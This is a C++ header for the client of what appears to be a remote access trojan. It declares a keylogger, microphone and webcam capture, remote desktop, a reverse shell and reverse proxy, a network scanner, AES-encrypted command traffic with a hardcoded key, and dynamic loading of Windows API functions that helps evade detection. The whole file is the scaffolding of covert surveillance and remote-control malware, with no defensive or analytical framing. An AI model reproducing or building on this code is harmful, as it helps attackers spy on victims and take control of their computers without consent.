#ifndef _CLIENTE_H
#define _CLIENTE_H 1

#include "headers.hpp"
#include "custom_defines.hpp"
#include "misc.hpp"
#include "mod_mic.hpp"
#include "mod_keylogger.hpp"
#include "mod_camara.hpp"
#include "mod_remote_desktop.hpp"
#include "mod_ventanas.hpp"
#include "mod_info.hpp"
#include "mod_reverse_proxy.hpp"
#include "mod_escaner.hpp"
#include "mod_fun.hpp"

typedef struct _WTS_PROCESS_INFOA {
	DWORD SessionId;
	DWORD ProcessId;
	LPSTR pProcessName;
	PSID  pUserSid;
} WTS_PROCESS_INFOA, * PWTS_PROCESS_INFOA;

struct Paquete {
	u_int uiTipoPaquete;
	u_int uiTamBuffer;
	u_int uiIsUltimo;
	std::vector<char> cBuffer;
};

struct Paquete_Queue {
	std::vector<char> cBuffer;
	u_int uiTipoPaquete;
};

struct Archivo_Descarga {
	std::shared_ptr<std::ofstream> ssOutfile;
	double uTamArchivo;
	double uDescargado;

	Archivo_Descarga():
		ssOutfile(nullptr), uTamArchivo(0), uDescargado(0){}

	~Archivo_Descarga() = default;
};

//Structs para dynamic_load
struct st_Kernel32 {
	//GetComputerNameA
	typedef BOOL(WINAPI* LPGETCOMPUTERNAMEA)(LPSTR, LPDWORD);
	LPGETCOMPUTERNAMEA pGetComputerName = nullptr;

	//GetNativeSystemInfo
	typedef void(WINAPI* LPGETNATIVESYSTEMINFO)(LPSYSTEM_INFO);
	LPGETNATIVESYSTEMINFO pGetNativeSystemInfo = nullptr;

	//CreateProcessA
	typedef BOOL(WINAPI* LPCREATEPROCESSA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
	LPCREATEPROCESSA pCreateProcessA = nullptr;

	//OpenProcess
	typedef HANDLE(WINAPI* LPOPENPROCESS)(DWORD, BOOL, DWORD); 
	LPOPENPROCESS pOpenProcess = nullptr;

	//TerminateProcess
	typedef BOOL(WINAPI* LPTERMINATEPROCESS)(HANDLE, UINT);
	LPTERMINATEPROCESS pTerminateProcess = nullptr;

	//CloseHandle
	typedef BOOL(WINAPI* LPCLOSEHANDLE)(HANDLE); 
	LPCLOSEHANDLE pCloseHandle = nullptr;

	//GlobalMemoryStatusEx
	typedef BOOL(WINAPI* LPGLOBALMEMORYSTATUSEX)(LPMEMORYSTATUSEX);
	LPGLOBALMEMORYSTATUSEX pGlobalMemoryStatusEx = nullptr;

	//CopyFileA
	typedef BOOL(WINAPI* LPCOPYFILEA)(LPCSTR, LPCSTR, BOOL);
	LPCOPYFILEA pCopyFileA = nullptr;

	//DeleteFileA
	typedef BOOL(WINAPI* LPDELETEFILEA)(LPCSTR);
	LPDELETEFILEA pDeleteFileA = nullptr;

	//ReadFile
	typedef BOOL(WINAPI* LPREADFILE)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
	LPREADFILE pReadFile = nullptr;

	//WriteFile
	typedef BOOL(WINAPI* LPWRITEFILE)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
	LPWRITEFILE pWriteFile = nullptr;

	//CreatePipe
	typedef BOOL(WINAPI* LPCREATEPIPE)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
	LPCREATEPIPE pCreatePipe = nullptr;

	//PeekNamedPipe
	typedef BOOL(WINAPI* LPPEEKNAMEDPIPE)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
	LPPEEKNAMEDPIPE pPeekNamedPipe = nullptr;

};

struct st_Advapi32 {
	//GetUserName
	typedef BOOL(WINAPI* LPGETUSERNAMEA)(LPSTR, LPDWORD);
	LPGETUSERNAMEA pGetUserName = nullptr;

	//RegOpenKeyEx
	typedef LSTATUS(WINAPI* LPREGOPENKEY)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY); 
	LPREGOPENKEY pRegOpenKeyEx = nullptr;

	//RegQueryValueEx
	typedef LSTATUS(WINAPI* LPREGQUERYVALUEEX)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD); 
	LPREGQUERYVALUEEX pRegQueryValueEx = nullptr;

	//RegCloseKey
	typedef LSTATUS(WINAPI* LPREGCLOSEKEY)(HKEY); 
	LPREGCLOSEKEY pRegCloseKey = nullptr;

	//LookupAccountSidA
	typedef BOOL(WINAPI* LPLOOKUPACCOUNTSIDA)(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
	LPLOOKUPACCOUNTSIDA pLookupAccountSidA = nullptr;
};

struct st_Shell32 {
	//ShellExecuteExA
	typedef BOOL(WINAPI* LPSHELLEXECUTEEXA)(SHELLEXECUTEINFOA*); 
	LPSHELLEXECUTEEXA pShellExecuteExA = nullptr;
};

struct st_PsApi {
	//GetModuleFileNameExA
	typedef DWORD(WINAPI* LPGETMODULEFILNAMEEX)(HANDLE, HMODULE, LPSTR, DWORD);
	LPGETMODULEFILNAMEEX pGetModuleFileNameExA = nullptr;
};

struct st_Wtsapi32 {
	//WTSEnumerateProcessesA
	typedef BOOL(WINAPI* LPWTSENUMERATEPROCESSES)(HANDLE, DWORD, DWORD, PWTS_PROCESS_INFOA*, DWORD*); 
	LPWTSENUMERATEPROCESSES pWTSEnumerateProcessesA = nullptr;

	//WTSFreeMemory
	typedef void(WINAPI* LPWTSFREEMEMORY)(PVOID); 
	LPWTSFREEMEMORY pWTSFreeMemory = nullptr;

};

struct st_Ws2_32 {
	//WSAStartup
	typedef int(WINAPI* LPWSASTARTUP)(WORD, LPWSADATA);
	LPWSASTARTUP pWsaStartup = nullptr;

	//inet_addr
	typedef unsigned long(WINAPI* LPINET_ADDR)(const char*);
	LPINET_ADDR pinet_addr = nullptr;

	//inet_ntoa
	//typedef char WSAAPI*(WINAPI* LPINET_NTOA)(in_addr);

};

class ReverseShell;
class Mod_Mic;

class Cliente {
	private:
		std::mutex sck_mutex;
		std::mutex mtx_shell;
		std::mutex mtx_running;
		std::mutex mtx_queue;
		std::mutex mtx_kill;
		std::mutex mtx_map_archivos;
		
		std::thread p_thQueue;

		unsigned char t_key[AES_KEY_LEN] = { 0x74, 0X48, 0X33, 0X2D, 0X4A, 0X5C, 0X2F, 0X61, 0X4E, 0X7C, 0X3C, 0X45, 0X72, 0X7B, 0X31, 0X33,
								  0X33, 0X37, 0X7D, 0X2E, 0X7E, 0X40, 0X69, 0X6C, 0X65, 0X72, 0X61, 0x25, 0x25, 0x5D, 0x72, 0x5E };
		ByteArray bKey;
		void Init_Key();

		//Modulos
		ReverseShell*      reverseSHELL     = nullptr;
		Mod_Mic*           mod_Mic          = nullptr;
		mod_Keylogger*     mod_Key          = nullptr;
		mod_Camera*        mod_Cam          = nullptr;
		mod_RemoteDesktop* mod_RemoteDesk   = nullptr;
		mod_AdminVentanas* mod_AdminVen     = nullptr;
		mod_Info*          mod_Inf0         = nullptr;
		mod_Escaner*       mod_Scan         = nullptr;
		modFun*            mod_Fun          = nullptr;
		
		//Map para armar los paquetes entrantes
		std::map<int, std::vector<char>> paquetes_Acumulados;

		//Map para recibir multiples archivos al mismo tiempo
		std::map<const std::string, struct Archivo_Descarga> map_Archivos_Descarga;

		//Queue para comandos recibidos
		std::queue<Paquete_Queue> queue_Comandos;

		bool isRunning = true;
		bool isQueueRunning = true;
		bool isShellRunning = false;
		bool BLOCK_MODE = false;
		bool killSwitch = false;
		
	public:
		void TEST();
		SOCKET sckSocket = INVALID_SOCKET;

		Cliente();
		~Cliente();
		
		ReverseProxy* mod_ReverseProxy = nullptr;
		
		//Misc
		std::string ObtenerDesk();
		std::string ObtenerDown();

		//Sockets
		bool bConectar(const char* cIP, const char* cPuerto);
		void CerrarConexion();

		//Socket wraps
		int send_all(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags);
		int recv_all(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags);
		int cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code);
		int cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool isBlock, DWORD* err_code);
		void m_SerializarPaquete(const Paquete& paquete, char* cBuffer);
		bool m_DeserializarPaquete(const char* cBuffer, Paquete& paquete, int bufer_size);
		int cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code, int iTipoPaquete);

		void Agregar_Archivo_Descarga(Archivo_Descarga& nuevo_archivo, const std::string strID);

		//AES
		ByteArray bDec(const unsigned char* pInput, size_t pLen);
		ByteArray bEnc(const unsigned char* pInput, size_t pLen);

		//Log Remoto
		void m_RemoteLog(const std::string _strMsg);

		//Armar y enviar paquete con informacion inicial
		void iniPacket();

		//Proceso de paquetes
		void MainLoop();
		void Process_Queue();
		void Spawn_QueueMan();
		void Add_to_Queue(const Paquete_Queue& paquete);
		void Procesar_Comando(const Paquete_Queue& paquete);
		void Procesar_Paquete(const Paquete& paquete);
		
		//Borrar objetos de modulos creados y detener su ejecucion
		void DestroyClasses();

		//Kill switch
		bool isKillSwitch();
		void setKillSwitch(bool _valor);

		//DLLs para dynamic_load
		HMODULE hKernel32DLL = NULL;
		HMODULE hAdvapi32DLL = NULL;
		HMODULE hShell32DLL  = NULL;
		HMODULE hWtsapi32DLL = NULL;
		HMODULE hPsApiDLL    = NULL;
		HMODULE hUser23DLL   = NULL;
		HMODULE hWs2_32DLL   = NULL;

		st_Advapi32 ADVAPI32;
		st_Shell32   SHELL32;
		st_Kernel32 KERNEL32;
		st_Wtsapi32 WTSAPI32;
		st_PsApi	   PSAPI;
		st_Ws2_32	    WS32;

		bool m_isRunning() {
			std::unique_lock<std::mutex> lock(mtx_running);
			return isRunning;
		}

		void m_Stop() {
			std::unique_lock<std::mutex> lock(mtx_running);
			isRunning = false;
		}

		bool m_isQueueRunning() {
			std::unique_lock<std::mutex> lock(mtx_queue);
			return isQueueRunning;
		}

		void m_StopQueue() {
			std::unique_lock<std::mutex> lock(mtx_queue);
			isQueueRunning = false;
		}
};

class ReverseShell {
	private:
		std::mutex mutex_shell;
		bool isRunning = false;
		PROCESS_INFORMATION pi;
		HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
		std::thread tRead;
	public:
		ReverseShell(Cliente* nFather) : sckSocket(nFather->sckSocket) {}
		SOCKET sckSocket;
		bool SpawnShell(const char* pStrComando);
		void StopShell();		
		void TerminarShell();

		bool m_IsRunning();

		void thEscribirShell(std::string pStrInput);
		void thLeerShell(HANDLE hPipe);
};

#endif
